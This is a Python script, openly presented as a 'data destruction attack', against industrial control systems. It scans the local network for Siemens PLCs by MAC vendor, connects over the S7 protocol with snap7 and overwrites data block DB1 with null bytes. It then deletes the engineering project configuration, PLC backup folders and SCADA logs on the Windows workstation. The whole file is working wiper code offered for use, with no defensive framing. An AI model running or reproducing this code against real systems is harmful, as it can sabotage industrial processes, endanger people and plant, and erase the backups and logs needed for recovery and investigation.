import os
import shutil
import socket
import scapy.all as scapy
import snap7
from snap7.util import *
from snap7.types import *

# Network scan to find PLC IP (Replace with your network range)
def find_plc_ip():
    print("[*] Scanning network for PLC...")
    arp_request = scapy.ARP(pdst="192.168.1.0/24")  # Adjust to your network range
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for element in answered_list:
        ip, mac = element[1].psrc, element[1].hwsrc
        if "Siemens" in scapy.conf.manufdb._resolve_MAC(mac):  # Identify Siemens PLCs
            print(f"[+] Found PLC at {ip} (MAC: {mac})")
            return ip
    print("[!] No PLC found on the network.")
    return None

# Destroy data on the PLC (using S7 protocol)
def destroy_plc_data(plc_ip):
    print(f"[*] Connecting to PLC at {plc_ip}...")
    client = snap7.client.Client()

    try:
        client.connect(plc_ip, 0, 1)  # Rack=0, Slot=1 (Adjust if needed)
        if client.get_connected():
            print("[+] Connected to PLC! Starting data destruction...")
            
            # Overwriting DB1 block with null bytes
            db_number = 1
            data_size = 256  # Adjust based on DB size
            null_data = bytearray([0] * data_size)
            client.db_write(db_number, 0, null_data)  
            print("[!] PLC Data Wiped!")
        else:
            print("[!] Failed to connect to PLC.")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client.disconnect()
        print("[*] PLC disconnected.")

# Destroy critical files on the local Windows system
def destroy_local_files():
    critical_paths = [
        r"C:\EngineeringProject\config.ini",  # Engineering workstation files
        r"C:\PLC_Backups",                    # PLC backups
        r"C:\SCADA_Logs",                      # SCADA logs
    ]

    print("[*] Deleting critical system recovery files...")
    for path in critical_paths:
        if os.path.exists(path):
            try:
                if os.path.isfile(path):
                    os.remove(path)
                elif os.path.isdir(path):
                    shutil.rmtree(path)
                print(f"[!] Deleted: {path}")
            except Exception as e:
                print(f"[!] Failed to delete {path}: {e}")
        else:
            print(f"[-] File/Directory not found: {path}")

# Execute the attack
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        destroy_plc_data(plc_ip)
    destroy_local_files()
    print("[*] Data destruction attack completed.")

if __name__ == "__main__":
    main()